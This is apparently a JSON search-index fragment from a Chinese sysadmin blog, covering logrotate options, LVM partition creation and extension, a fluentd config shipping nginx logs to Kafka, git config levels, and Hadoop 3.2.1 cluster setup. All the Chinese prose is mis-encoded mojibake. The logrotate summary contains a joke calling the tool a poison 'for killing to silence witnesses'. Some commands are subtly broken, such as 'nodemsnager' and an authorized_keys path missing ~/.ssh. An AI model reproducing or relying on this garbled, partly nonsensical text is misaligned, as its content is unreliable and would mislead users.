æ—¥å¿—åœ¨æ‹·è´å®Œåˆ°æ¸…ç©ºæ–‡ä»¶è¿™æ®µæ—¶é—´å†…ï¼Œç¨‹åºè¾“å‡ºçš„æ—¥å¿—æ²¡æœ‰å¤‡ä»½å°±æ¸…ç©ºäº†ï¼Œè¿™äº›æ—¥å¿—ä¸æ˜¯ä¸¢äº†å—ï¼Ÿæ˜¯çš„ï¼Œcopytruncateæœ‰ä¸¢å¤±éƒ¨åˆ†æ—¥å¿—å†…å®¹çš„é£é™©ã€‚æ‰€ä»¥èƒ½ç”¨createçš„æ–¹æ¡ˆå°±åˆ«ç”¨copytruncateã€‚æ‰€ä»¥å¾ˆå¤šç¨‹åºæä¾›äº†é€šçŸ¥æˆ‘æ›´æ–°æ‰“å¼€æ—¥å¿—æ–‡ä»¶çš„åŠŸèƒ½æ¥æ”¯æŒcreateæ–¹æ¡ˆï¼Œæˆ–è€…è‡ªå·±åšäº†æ—¥å¿—æ»šåŠ¨ï¼Œä¸ä¾èµ–logrotateã€‚ ","date":"2020-07-28 17:25","objectID":"/post/1903/:4:1","tags":["log"],"title":"logrotateæœºåˆ¶å’ŒåŸç†","uri":"/post/1903/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æ€»ç»“ logrotateæ˜¯ä¸ªä¼˜ç§€çš„æ—¥å¿—æ»šåŠ¨å·¥å…·ï¼Œå®ƒæ˜¯ç”¨èœ‚èœœï¼Œå·è´ï¼Œæ¡”æ¢—ï¼ŒåŠ ä¸Šå¤©å±±é›ªè²é…åˆ¶è€Œæˆï¼Œä¸é¡»å†·è—ï¼Œä¹Ÿæ²¡æœ‰é˜²è…å‰‚ï¼Œé™¤äº†æ¯’æ€§çŒ›çƒˆä¹‹å¤–ï¼Œå‘³é“è¿˜å¾ˆå¥½åƒã€‚å®åœ¨æ˜¯å±…å®¶æ—…è¡Œã€æ€äººç­å£å¿…å¤‡è‰¯è¯ï¼ ","date":"2020-07-28 17:25","objectID":"/post/1903/:5:0","tags":["log"],"title":"logrotateæœºåˆ¶å’ŒåŸç†","uri":"/post/1903/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å‘½ä»¤ # å°è¯•æ—¥å¿—åˆ‡å‰²(ä¸ä¼šçœŸæ­£åˆ‡å‰²) logrotate -d /etc/logrotate.d/xxx # å¼ºåˆ¶å°è¯•æ—¥å¿—åˆ‡å‰²(ä¸ä¼šçœŸæ­£åˆ‡å‰²ï¼Œæœªè¾¾åˆ°åˆ‡å‰²æ—¶é—´ä¹Ÿä¼šæ¨¡æ‹Ÿæ‰§è¡Œåˆ‡å‰²æ“ä½œ) logrotate -d -f /etc/logrotate.d/xxx # å¼ºåˆ¶åˆ‡å‰² logrotate -f /etc/logrotate.d/xxx /etc/cron.daily/logrotateä¸­æœ‰ä¸ªä»»åŠ¡æ¯å¤©æ‰§è¡Œ ","date":"2020-07-28 16:45","objectID":"/post/1902/:1:0","tags":["log"],"title":"logrotateæ—¥å¿—åˆ‡å‰²å½’æ¡£","uri":"/post/1902/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"é»˜è®¤é…ç½®æ–‡ä»¶ vim /etc/logrotate.conf # see \"man logrotate\" for details # åˆ‡å‰²å‘¨æœŸ,daily-æ¯å¤©åˆ‡å‰², weekly-æ¯å‘¨åˆ‡å‰², monthly-æ¯æœˆåˆ‡å‰², weekly # é»˜è®¤ä¿ç•™4ä¸ªæ–‡ä»¶ rotate 4 # åˆ‡å‰²ååˆ›å»ºæ–°çš„æ—¥å¿—æ–‡ä»¶ create # ä½¿ç”¨æ—¥æœŸåšä¸ºåˆ‡å‰²åæ–‡ä»¶çš„åç¼€å dateext # åˆ‡å‰²åçš„æ—¥å¿—å‹ç¼© #compress # RPM packages drop log rotation information into this directory include /etc/logrotate.d # no packages own wtmp and btmp -- we'll rotate them here /var/log/wtmp { monthly # æ¯æœˆåˆ‡å‰² create 0664 root utmp # åˆ›å»ºæ—¥å¿—æ–‡ä»¶çš„æƒé™ã€å±ä¸»å’Œå±ç»„ minsize 1M # æ—¥å¿—å¤§äºç­‰äº1Mæ‰ä¼šåˆ‡å‰² rotate 1 # ä¿ç•™ä¸€ä¸ªæ—¥å¿— } /var/log/btmp { missingok # åˆ‡å‰²æœŸé—´ä¸¢å¤±çš„æ—¥å¿—ï¼Œé”™è¯¯å¿½ç•¥ monthly # æ¯æœˆåˆ‡å‰² create 0600 root utmp # åˆ›å»ºæ—¥å¿—æ–‡ä»¶çš„æƒé™ã€å±ä¸»å’Œå±ç»„ rotate 1 # ä¿ç•™ä¸€ä¸ªæ—¥å¿— } ","date":"2020-07-28 16:45","objectID":"/post/1902/:2:0","tags":["log"],"title":"logrotateæ—¥å¿—åˆ‡å‰²å½’æ¡£","uri":"/post/1902/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å¸¸ç”¨å‚æ•°ï¼š # weeklyã€dailyã€monthlyã€yearlyåˆ‡å‰²å‘¨æœŸï¼Œhourlyéœ€è¦è‡ªå·±ä¿®æ”¹å®šæ—¶ä»»åŠ¡ daily # ä¿ç•™10ä¸ªæ—¥å¿— rotate 10 # createå’Œä¸‹é¢çš„copytruncateäºŒé€‰ä¸€ # å¦‚æœç¨‹åºæ”¯æŒé‡æ–°åŠ è½½é…ç½®ã€é‡å†™æ—¥å¿—ï¼Œä¾‹å¦‚nginx create 0644 www root # å¦‚æœç¨‹åºä¸æ”¯æŒé‡æ–°åŠ è½½é…ç½®ï¼Œä¸ºäº†ä¸å½±å“æ—¥å¿—å†™å…¥ï¼Œå¯ä»¥ä½¿ç”¨copytruncateã€‚ä¾‹å¦‚redis,nohup copytruncate # å‹ç¼©åˆ‡å‰²åçš„æ—¥å¿—æ–‡ä»¶ compress # ä½¿ç”¨æ—¥æœŸåšä¸ºåˆ‡å‰²åæ–‡ä»¶çš„åç¼€å dateext # æ—¥æœŸæ ¼å¼ï¼Œä»…æ”¯æŒ%Y%m%d%H%s dateformat -%Y%m%d.%s # ä½¿ç”¨æ˜¨å¤©çš„æ—¥æœŸ dateyesterday # ä¿ç•™.logæ‰©å±•å extension .log # æ—¥å¿—ä¸ºç©ºä¸åˆ‡å‰² notifempty # å¦‚æœæ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼Œä¸ä¼šå‘å‡ºé”™è¯¯ missingok # åˆ‡å‰²åçš„æ—¥å¿—æ–‡ä»¶æ”¾åˆ°æŒ‡å®šçš„ç›®å½• olddir /backup/logs/ # olddiræŒ‡å®šçš„ç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºè¯¥ç›®å½• createolddir 755 root root # å®šæœŸåˆ‡å‰²æ—¥å¿—æ—¶ä¼šåˆ¤æ–­æ–‡ä»¶å¤§å°ï¼Œè¾¾åˆ°2Mæ‰ä¼šåˆ‡å‰²(å¯ä»¥ä½¿ç”¨k,M,Gå•ä½) minsize 2M # å½“æ–‡ä»¶è¾¾åˆ°5Mï¼Œå³ä½¿æ²¡æœ‰è¾¾åˆ°åˆ‡å‰²å‘¨æœŸä¹Ÿä¼šåˆ‡å‰²æ—¥å¿—(éœ€è¦å•ç‹¬å†™å®šæ—¶ä»»åŠ¡) maxsize 5M æ‰§è¡Œè„šæœ¬éƒ¨åˆ† sharescripts prerotate echo \"åˆ‡å‰²æ—¥å¿—å‰æ‰§è¡Œ\" endscript postrotate echo \"åˆ‡å‰²æ—¥å¿—åæ‰§è¡Œ\" endscript ","date":"2020-07-28 16:45","objectID":"/post/1902/:3:0","tags":["log"],"title":"logrotateæ—¥å¿—åˆ‡å‰²å½’æ¡£","uri":"/post/1902/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æ¨¡æ¿ï¼š # æ—¥å¿—è·¯å¾„ /var/log/xxx/*.log { daily rotate 10 create 0644 www root dateext compress notifempty missingok sharedscripts postrotate /bin/kill -USR1 `cat /run/nginx.pid 2\u003e/dev/null` 2\u003e/dev/null || true endscript } ","date":"2020-07-28 16:45","objectID":"/post/1902/:4:0","tags":["log"],"title":"logrotateæ—¥å¿—åˆ‡å‰²å½’æ¡£","uri":"/post/1902/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"åŸæ–‡é“¾æ¥ï¼šhttps://linux.cn/article-5117-1.html 1.åœ¨åä¸ºvg_newlvmçš„å·ç»„ä¸­åˆ›å»º15Gå¤§å°çš„é€»è¾‘å·ï¼š lvcreate -L 15G vg_newlvm 2.åœ¨åä¸ºvgnewlvmçš„å·ç»„ä¸­åˆ›å»ºå¤§å°ä¸º2500MBçš„é€»è¾‘å·ï¼Œå¹¶å‘½åä¸ºcentos7newvolï¼Œè¿™æ ·å°±åˆ›å»ºäº†å—è®¾å¤‡/dev/vgnewlvm/centos7newvolï¼š lvcreate -L 2500 -n centos7_newvol vg_newlvm 3.å¯ä»¥ä½¿ç”¨lvcreateå‘½ä»¤çš„å‚æ•°-læ¥æŒ‡å®šé€»è¾‘å·æ‰©å±•çš„å¤§å°ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ªå‚æ•°ä»¥å·ç»„çš„å¤§å°ç™¾åˆ†æ¯”æ¥æ‰©å±•é€»è¾‘å·ã€‚è¿™ä¸‹åˆ—çš„å‘½ä»¤åˆ›å»ºäº†centos7newvolå·ç»„çš„50%å¤§å°çš„é€»è¾‘å·vgnewlvm: lvcreate -l 50%VG -n centos7_newvol vg_newlvm 4.ä½¿ç”¨å·ç»„å‰©ä¸‹çš„æ‰€æœ‰ç©ºé—´åˆ›å»ºé€»è¾‘å· lvcreate --name centos7newvol -l 100%FREE vgnewlvm ","date":"2020-07-24 17:55","objectID":"/post/1900/:0:0","tags":["lvm"],"title":"4ä¸ªlvcreateå‘½ä»¤ä¾‹å­","uri":"/post/1900/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å°†sdbåˆ†åŒºå®¹é‡æ‰©å®¹è‡³æ ¹åˆ†åŒº ","date":"2020-07-24 16:37","objectID":"/post/826/:1:0","tags":["lvm"],"title":"ä½¿ç”¨LVMæ‰©å®¹åˆ†åŒº","uri":"/post/826/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1.æŸ¥çœ‹å½“å‰åˆ†åŒºæƒ…å†µï¼š ","date":"2020-07-24 16:37","objectID":"/post/826/:1:1","tags":["lvm"],"title":"ä½¿ç”¨LVMæ‰©å®¹åˆ†åŒº","uri":"/post/826/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"2.ç»™sdbåˆ›å»ºä¸¤ä¸ªåˆ†åŒº(fdiské€‚ç”¨äº2TBä»¥ä¸‹çš„ç¡¬ç›˜ï¼Œè¶…è¿‡2Tä½¿ç”¨parted) ","date":"2020-07-24 16:37","objectID":"/post/826/:1:2","tags":["lvm"],"title":"ä½¿ç”¨LVMæ‰©å®¹åˆ†åŒº","uri":"/post/826/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"3.åˆ›å»ºPV # åˆ›å»ºPV pvcreate /dev/sdb1 /dev/sdb2 #æŸ¥çœ‹PV pvdisplay pvscan pvs ","date":"2020-07-24 16:37","objectID":"/post/826/:1:3","tags":["lvm"],"title":"ä½¿ç”¨LVMæ‰©å®¹åˆ†åŒº","uri":"/post/826/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"4.æ‰©å±•VG # æŸ¥çœ‹vg vgs # æ‰©å±•VG vgextend centos /dev/sdb1 ","date":"2020-07-24 16:37","objectID":"/post/826/:1:4","tags":["lvm"],"title":"ä½¿ç”¨LVMæ‰©å®¹åˆ†åŒº","uri":"/post/826/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"5.æ‰©å±•LV ä½¿ç”¨-l 100%VGè¿™ä¸ªå‚æ•°ä»¥å·ç»„çš„å¤§å°ç™¾åˆ†æ¯”æ¥æ‰©å±•é€»è¾‘å· lvextend -l 100%VG /dev/mapper/centos-root ","date":"2020-07-24 16:37","objectID":"/post/826/:1:5","tags":["lvm"],"title":"ä½¿ç”¨LVMæ‰©å®¹åˆ†åŒº","uri":"/post/826/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"6.æ‰©å±•æ–‡ä»¶ç³»ç»Ÿ xfs_growfs /dev/mapper/centos-root centos6ä½¿ç”¨ï¼šresize2fs /dev/mapper/centos-root ","date":"2020-07-24 16:37","objectID":"/post/826/:1:6","tags":["lvm"],"title":"ä½¿ç”¨LVMæ‰©å®¹åˆ†åŒº","uri":"/post/826/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"7.éªŒè¯å¤§å° lsblk ","date":"2020-07-24 16:37","objectID":"/post/826/:1:7","tags":["lvm"],"title":"ä½¿ç”¨LVMæ‰©å®¹åˆ†åŒº","uri":"/post/826/"},{"categories":["åŸºç¡€å†…å®¹"],"content":" 94105-dsc4huyofum.png PVï¼šç‰©ç†å· PEï¼šLVMçš„æœ€å°èµ„æºå•ä½ï¼Œæ¯ä¸ªPEçš„å¤§å°å¯ä»¥æ›´æ”¹ï¼Œé»˜è®¤4M VGï¼šå·ç»„ï¼Œåœ¨PVçš„åŸºç¡€ä¸Šå»ºç«‹ LVï¼šé€»è¾‘å·ï¼Œåœ¨VGçš„åŸºç¡€ä¸Šå»ºç«‹ï¼Œç†è§£ä¸ºåˆ†åŒºï¼Œå¯ä»¥æ”¹åŠ¨å¤§å° ","date":"2020-07-24 13:38","objectID":"/post/1896/:0:0","tags":["lvm"],"title":"ä½¿ç”¨LVMæŒ‚è½½åˆ†åŒº","uri":"/post/1896/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"åˆ›å»ºä½¿ç”¨pvã€vgã€lv ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:0","tags":["lvm"],"title":"ä½¿ç”¨LVMæŒ‚è½½åˆ†åŒº","uri":"/post/1896/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1.åˆ›å»ºæ™®é€šåˆ†åŒºï¼Œæˆ‘è¿™é‡Œå·²ç»æœ‰ä¸€ä¸ªsdb2åˆ†åŒºäº† 80785-qnldp7k6hd.png ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:1","tags":["lvm"],"title":"ä½¿ç”¨LVMæŒ‚è½½åˆ†åŒº","uri":"/post/1896/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"2.åˆ›å»ºpv pvcreate /dev/sdb2 ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:2","tags":["lvm"],"title":"ä½¿ç”¨LVMæŒ‚è½½åˆ†åŒº","uri":"/post/1896/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"3.åˆ›å»ºvg # å¯ä»¥æŒ‡å®šå¤šä¸ªåˆ†åŒºï¼Œæˆ‘è¿™é‡Œåªæœ‰ä¸€ä¸ª vgcreate data /dev/sdb2 #å°†vgè®¾ç½®ä¸ºæ´»åŠ¨çŠ¶æ€ vgchange -ay data ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:3","tags":["lvm"],"title":"ä½¿ç”¨LVMæŒ‚è½½åˆ†åŒº","uri":"/post/1896/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"4.åˆ›å»ºlv ä½¿ç”¨-l 100%VGè¿™ä¸ªå‚æ•°ä»¥å·ç»„çš„å¤§å°ç™¾åˆ†æ¯”æ¥æ‰©å±•é€»è¾‘å· lvcreate -l 100%VG -n datalv data ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:4","tags":["lvm"],"title":"ä½¿ç”¨LVMæŒ‚è½½åˆ†åŒº","uri":"/post/1896/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"5.æ ¼å¼åŒ–æ–‡ä»¶ç³»ç»Ÿ mkfs.xfs /dev/mapper/data-datalv centos6ä½¿ç”¨ï¼šmkfs.ext4 /dev/mapper/data-datalv ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:5","tags":["lvm"],"title":"ä½¿ç”¨LVMæŒ‚è½½åˆ†åŒº","uri":"/post/1896/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"6.æŒ‚è½½ # åˆ›å»ºæŒ‚è½½ç‚¹ mkdir /data mount /dev/mapper/data-datalv /data ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:6","tags":["lvm"],"title":"ä½¿ç”¨LVMæŒ‚è½½åˆ†åŒº","uri":"/post/1896/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"7.è®¾ç½®å¼€æœºè‡ªåŠ¨æŒ‚è½½ vim /etc/fstab /dev/mapper/data-datalv /data xfs defaults 0 0 ","date":"2020-07-24 13:38","objectID":"/post/1896/:1:7","tags":["lvm"],"title":"ä½¿ç”¨LVMæŒ‚è½½åˆ†åŒº","uri":"/post/1896/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æ‰©å®¹ï¼š ","date":"2020-07-24 13:38","objectID":"/post/1896/:2:0","tags":["lvm"],"title":"ä½¿ç”¨LVMæŒ‚è½½åˆ†åŒº","uri":"/post/1896/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1.æ‰©å±•vg ç›´æ¥å°†/dev/sdcè¿™å—ç¡¬ç›˜ä½œä¸ºPVä½¿ç”¨ï¼ŒåŠ å…¥åˆ°dataè¿™ä¸ªvgé‡Œ vgextend data /dev/sdc ä»vgä¸­ç§»é™¤pvï¼švgreduce data /dev/sdc ","date":"2020-07-24 13:38","objectID":"/post/1896/:2:1","tags":["lvm"],"title":"ä½¿ç”¨LVMæŒ‚è½½åˆ†åŒº","uri":"/post/1896/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"2.æ‰©å±•lv # æ·»åŠ å‰©ä½™ç©ºé—´çš„100%å¤§å° lvextend -l +100%FREE /dev/mapper/data-datalv ","date":"2020-07-24 13:38","objectID":"/post/1896/:2:2","tags":["lvm"],"title":"ä½¿ç”¨LVMæŒ‚è½½åˆ†åŒº","uri":"/post/1896/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"3.æ‰©å±•æ–‡ä»¶ç³»ç»Ÿ xfs_growfs /dev/data/datalv centos6ä½¿ç”¨ï¼šresize2fs /dev/data/datalv ","date":"2020-07-24 13:38","objectID":"/post/1896/:2:3","tags":["lvm"],"title":"ä½¿ç”¨LVMæŒ‚è½½åˆ†åŒº","uri":"/post/1896/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"å®˜æ–¹æ–‡æ¡£ \u003csource\u003e @type tail path /var/log/nginx/access.log pos_file /tmp/nginx.log.pos tag nginx.access \u003cparse **\u003e @type nginx expression /^(?\u003cremote\u003e[^ ]*) (?\u003chost\u003e[^ ]*) (?\u003cuser\u003e[^ ]*) \\[(?\u003ctime\u003e[^\\]]*)\\] \"(?\u003cmethod\u003e\\S+)(?: +(?\u003cpath\u003e[^\\\"]*?)(?: +\\S*)?)?\" (?\u003ccode\u003e[^ ]*) (?\u003csize\u003e[^ ]*)(?: \"(?\u003creferer\u003e[^\\\"]*)\" \"(?\u003cagent\u003e[^\\\"]*)\"(?:\\s+(?\u003chttp_x_forwarded_for\u003e[^ ]+))?)?$/ \u003c/parse\u003e \u003c/source\u003e \u003cfilter nginx.**\u003e @type record_transformer \u003crecord\u003e name \"soulchild\" \u003c/record\u003e \u003c/filter\u003e \u003cmatch nginx.**\u003e @type kafka2 brokers 10.0.0.190:9092,10.0.0.191:9092,10.0.0.192:9092 topic_key nginx_tag default_topic nginx.access \u003cbuffer\u003e flush_interval 5s \u003c/buffer\u003e \u003cformat\u003e @type json \u003c/format\u003e \u003c/match\u003e ","date":"2020-07-24 08:48","objectID":"/post/1886/:0:0","tags":["fluentd"],"title":"fluentdæ”¶é›†nginxæ—¥å¿—å¹¶è¾“å‡ºåˆ°kafka","uri":"/post/1886/"},{"categories":["å…¶ä»–"],"content":"gité…ç½®çš„ä¸‰ä¸ªçº§åˆ« --local: ä»“åº“çº§(ä»…é’ˆå¯¹æŸä¸ªgitä»“åº“.git/config) --global: ç”¨æˆ·çº§(ç³»ç»Ÿç”¨æˆ·çš„é…ç½®~/.gitconfig) --system: ç³»ç»Ÿçº§(gitçº§é…ç½®/private/etc/gitconfig) ä¿®æ”¹ä¿¡æ¯ git config --local user.name 'SoulChild' git config --local user.email '742899387@qq.com' ","date":"2020-07-15 13:45","objectID":"/post/2712/:0:0","tags":[],"title":"gitè®¾ç½®æäº¤è€…ä¿¡æ¯","uri":"/post/2712/"},{"categories":["hadoop"],"content":"HDFSçš„å®ˆæŠ¤è¿›ç¨‹åˆ†åˆ«æ˜¯NameNode, SecondaryNameNode,DataNode. YARNçš„å®ˆæŠ¤è¿›ç¨‹åˆ†åˆ«æ˜¯ResourceManager, NodeManager,WebAppProxy. ","date":"2020-07-13 15:30","objectID":"/post/1877/:0:0","tags":["hadoop"],"title":"hadoop3.2.1é›†ç¾¤éƒ¨ç½²","uri":"/post/1877/"},{"categories":["hadoop"],"content":"ä¸€ã€å®‰è£…å‰å‡†å¤‡ï¼š |ä¸»æœºå|IP|è§’è‰²| |- |hadoop-01| 10.0.0.150|namenodeã€datanodeã€resourcemanagerã€nodemanager| |hadoop-02| 10.0.0.151|datanodeã€nodemanager| |hadoop-03| 10.0.0.152|datanodeã€nodemanager| ","date":"2020-07-13 15:30","objectID":"/post/1877/:1:0","tags":["hadoop"],"title":"hadoop3.2.1é›†ç¾¤éƒ¨ç½²","uri":"/post/1877/"},{"categories":["hadoop"],"content":"1.hostsè§£æï¼š ä¸‰å°æœºå™¨é…ç½® cat \u003e\u003e /etc/hosts \u003c\u003cEOF 10.0.0.150 hadoop-01 10.0.0.151 hadoop-02 10.0.0.152 hadoop-03 EOF ","date":"2020-07-13 15:30","objectID":"/post/1877/:1:1","tags":["hadoop"],"title":"hadoop3.2.1é›†ç¾¤éƒ¨ç½²","uri":"/post/1877/"},{"categories":["hadoop"],"content":"2.é…ç½®å…å¯†ç™»é™† # åˆ›å»ºç”¨æˆ· useradd hadoop su hadoop ssh-keygen -P '' -t rsa -f ~/.ssh/id_rsa cat ~/.ssh/id_rsa.pub \u003e\u003e authorized_keys chmod 600 ~/.ssh/authorized_keys # å‘é€é…ç½®åˆ°å…¶ä»–æœºå™¨ for i in {151..152};do scp -rp ~/.ssh/ root@10.0.0.$i:/home/hadoop/;done for i in {151..152};do ssh root@10.0.0.$i chown -R hadoop:hadoop /home/hadoop/;done ","date":"2020-07-13 15:30","objectID":"/post/1877/:1:2","tags":["hadoop"],"title":"hadoop3.2.1é›†ç¾¤éƒ¨ç½²","uri":"/post/1877/"},{"categories":["hadoop"],"content":"3.å‡†å¤‡å®‰è£…åŒ…ï¼š ä¸‰å°æœºå™¨é…ç½® mkdir /server/packages -p cd /server/packages [root@hadoop-01 packages]# ls /server/packages/ hadoop-3.2.1.tar.gz jdk-8u221-linux-x64.tar.gz # å‘é€è½¯ä»¶åŒ…åˆ°å…¶ä»–èŠ‚ç‚¹ for i in {151..152};do scp ./* hadoop@10.0.0.$i:`pwd`;done ","date":"2020-07-13 15:30","objectID":"/post/1877/:1:3","tags":["hadoop"],"title":"hadoop3.2.1é›†ç¾¤éƒ¨ç½²","uri":"/post/1877/"},{"categories":["hadoop"],"content":"äºŒã€å®‰è£…jdkï¼š ä¸‰å°æœºå™¨é…ç½® tar xf jdk-8u221-linux-x64.tar.gz mv jdk1.8.0_221/ /usr/local/jdk ","date":"2020-07-13 15:30","objectID":"/post/1877/:2:0","tags":["hadoop"],"title":"hadoop3.2.1é›†ç¾¤éƒ¨ç½²","uri":"/post/1877/"},{"categories":["hadoop"],"content":"ä¸‰ã€å®‰è£…hadoop ä¸‰å°æœºå™¨é…ç½® tar xf hadoop-3.2.1.tar.gz mv hadoop-3.2.1 /usr/local/hadoop chown -R hadoop.hadoop /usr/local/hadoop ","date":"2020-07-13 15:30","objectID":"/post/1877/:3:0","tags":["hadoop"],"title":"hadoop3.2.1é›†ç¾¤éƒ¨ç½²","uri":"/post/1877/"},{"categories":["hadoop"],"content":"å››ã€é…ç½®ç¯å¢ƒå˜é‡ ä¸‰å°æœºå™¨é…ç½® echo 'export JAVA_HOME=/usr/local/jdk' \u003e\u003e /etc/profile echo 'export HADOOP_HOME=/usr/local/hadoop' \u003e\u003e /etc/profile echo 'export PATH=$PATH:$JAVA_HOME/bin:$HADOOP_HOME/bin' \u003e\u003e /etc/profile source /etc/profile ","date":"2020-07-13 15:30","objectID":"/post/1877/:4:0","tags":["hadoop"],"title":"hadoop3.2.1é›†ç¾¤éƒ¨ç½²","uri":"/post/1877/"},{"categories":["hadoop"],"content":"äº”ã€é…ç½®hadoop åœ¨æ¯ä¸ªèŠ‚ç‚¹é…ç½®JAVA_HOME su hadoop cd /usr/local/hadoop sed -i 's@# export JAVA_HOME=@export JAVA_HOME=/usr/local/jdk@' etc/hadoop/hadoop-env.sh etc/hadoop/core-site.xml \u003cconfiguration\u003e \u003cproperty\u003e \u003c!--ä½¿ç”¨é»˜è®¤æ–‡ä»¶ç³»ç»Ÿ--\u003e \u003cname\u003efs.defaultFS\u003c/name\u003e \u003c!--æŒ‡å®šæ–‡ä»¶ç³»ç»Ÿçš„IPå’Œç«¯å£--\u003e \u003cvalue\u003ehdfs://hadoop-01:9000\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e etc/hadoop/hdfs-site.xml \u003c!--é»˜è®¤å€¼3,hdfså­˜å‚¨æ•°æ®çš„å‰¯æœ¬æ•°--\u003e \u003cproperty\u003e \u003cname\u003edfs.replication\u003c/name\u003e \u003cvalue\u003e3\u003c/value\u003e \u003c/property\u003e \u003c!--dfs namenode webç•Œé¢çš„ç›‘å¬åœ°å€--\u003e \u003cproperty\u003e \u003cname\u003edfs.namenode.http-address\u003c/name\u003e \u003cvalue\u003ehadoop-01:9870\u003c/value\u003e \u003c/property\u003e \u003c!-- dfsä¿å­˜namenodeæ•°æ®çš„è·¯å¾„--\u003e \u003cproperty\u003e \u003cname\u003edfs.namenode.name.dir\u003c/name\u003e \u003cvalue\u003e/data/hadoop/hdfs/name\u003c/value\u003e \u003c/property\u003e \u003c!-- dfsä¿å­˜datanodeæ•°æ®çš„è·¯å¾„--\u003e \u003cproperty\u003e \u003cname\u003edfs.datanode.data.dir\u003c/name\u003e \u003cvalue\u003e/data/hadoop/hdfs/data\u003c/value\u003e \u003c/property\u003e etc/hadoop/yarn-site.xml é…ç½®ResourceManagerå’ŒNodeManager: \u003cproperty\u003e \u003cname\u003eyarn.resourcemanager.hostname\u003c/name\u003e \u003cvalue\u003ehadoop-01\u003c/value\u003e \u003c/property\u003e etc/hadoop/mapred-site.xml é…ç½®MapReduce \u003cproperty\u003e \u003c!--æ‰§è¡Œæ¡†æ¶è®¾ç½®ä¸ºYARN--\u003e \u003cname\u003emapreduce.framework.name\u003c/name\u003e \u003cvalue\u003eyarn\u003c/value\u003e \u003c/property\u003e æ·»åŠ å·¥ä½œèŠ‚ç‚¹ä¿¡æ¯ cat \u003e etc/hadoop/workers \u003c\u003cEOF hadoop-01 hadoop-02 hadoop-03 EOF å¤åˆ¶é…ç½®æ–‡ä»¶ cd /usr/local/hadoop for i in {151..152};do scp -rp etc/hadoop/* 10.0.0.$i:`pwd`/etc/hadoop;done ","date":"2020-07-13 15:30","objectID":"/post/1877/:5:0","tags":["hadoop"],"title":"hadoop3.2.1é›†ç¾¤éƒ¨ç½²","uri":"/post/1877/"},{"categories":["hadoop"],"content":"6.å¯åŠ¨hdfs # æ ¼å¼åŒ–æ–‡ä»¶ç³»ç»Ÿ hdfs namenode -format # å¯åŠ¨nodename hdfs --daemon start namenode hdfs --daemon start datanode hadoop-02ï¼Œhadoop-03å¯åŠ¨datanode hdfs --daemon start datanode ","date":"2020-07-13 15:30","objectID":"/post/1877/:6:0","tags":["hadoop"],"title":"hadoop3.2.1é›†ç¾¤éƒ¨ç½²","uri":"/post/1877/"},{"categories":["hadoop"],"content":"7.å¯åŠ¨yarn hadoop-01å¯åŠ¨resourcemanagerã€nodemanager yarn --daemon start resourcemanager yarn --daemon start nodemsnager hadoop-02ã€hadoop-03å¯åŠ¨nodemanager yarn --daemon start nodemanager hdfs webç•Œé¢ï¼š http://hadoop-01:9870 yarn webç•Œé¢ï¼š http://hadoop-01:8088/cluster/nodes ","date":"2020-07-13 15:30","objectID":"/post/1877/:7:0","tags":["hadoop"],"title":"hadoop3.2.1é›†ç¾¤éƒ¨ç½²","uri":"/post/1877/"},{"categories":["hadoop"],"content":"1.å®‰è£…jdkï¼š tar xf jdk-8u221-linux-x64.tar.gz mv jdk1.8.0_221 /usr/local/jdk ","date":"2020-07-13 10:19","objectID":"/post/1876/:0:1","tags":["hadoop"],"title":"hadoop3.2.1ä¼ªåˆ†å¸ƒå¼æ¨¡å¼å®‰è£…","uri":"/post/1876/"},{"categories":["hadoop"],"content":"2.å®‰è£…hadoopï¼š wget https://mirrors.bfsu.edu.cn/apache/hadoop/common/hadoop-3.2.1/hadoop-3.2.1.tar.gz mv hadoop-3.2.1 /usr/local/hadoop useradd hadoop chown -R hadoop.hadoop /usr/local/hadoop ","date":"2020-07-13 10:19","objectID":"/post/1876/:0:2","tags":["hadoop"],"title":"hadoop3.2.1ä¼ªåˆ†å¸ƒå¼æ¨¡å¼å®‰è£…","uri":"/post/1876/"},{"categories":["hadoop"],"content":"3.é…ç½®ç¯å¢ƒå˜é‡ echo 'export JAVA_HOME=/usr/local/jdk' \u003e\u003e /etc/profile echo 'export HADOOP_HOME=/usr/local/hadoop' \u003e\u003e /etc/profile echo 'export PATH=$PATH:$JAVA_HOME/bin:$HADOOP_HOME/bin' \u003e\u003e /etc/profile ","date":"2020-07-13 